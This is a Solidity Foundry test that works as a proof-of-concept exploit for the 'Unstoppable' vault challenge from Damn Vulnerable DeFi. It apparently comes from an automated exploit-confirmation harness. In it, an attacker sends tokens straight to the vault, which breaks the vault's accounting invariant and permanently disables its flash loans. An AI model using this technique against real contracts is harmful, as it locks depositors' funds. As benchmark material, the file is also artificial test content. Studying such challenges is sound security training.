// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {UnstoppableVault} from "src/unstoppable/UnstoppableVault.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Damn Valuable Token", "DVT", 18) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract FlashBorrower is IERC3156FlashBorrower {
    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        ERC20(token).approve(msg.sender, amount + fee);
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
}

contract UnstoppableExploit is Test {
    MockToken token;
    UnstoppableVault vault;
    FlashBorrower borrower;

    address owner = makeAddr("owner");
    address feeRecipient = makeAddr("feeRecipient");
    address depositor = makeAddr("depositor");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockToken();
        vault = new UnstoppableVault(ERC20(address(token)), owner, feeRecipient);
        borrower = new FlashBorrower();

        // Legitimate depositor funds the vault
        token.mint(depositor, 1_000_000 ether);
        vm.startPrank(depositor);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1_000_000 ether, depositor);
        vm.stopPrank();

        // Attacker funds
        token.mint(attacker, 1 ether);
    }

    function testExploit() public {
        // Before interaction: flash loan works fine (legit path succeeds)
        vault.flashLoan(borrower, address(token), 100 ether, "");

        // Attacker breaks the ERC4626 invariant via a direct token transfer
        vm.prank(attacker);
        token.transfer(address(vault), 1 ether);

        // Now the flash loan (the service) is permanently bricked
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        vault.flashLoan(borrower, address(token), 100 ether, "");

        emit log_string("REDFORGE_ORACLE_CONFIRMED:funds_locked");
    }
}

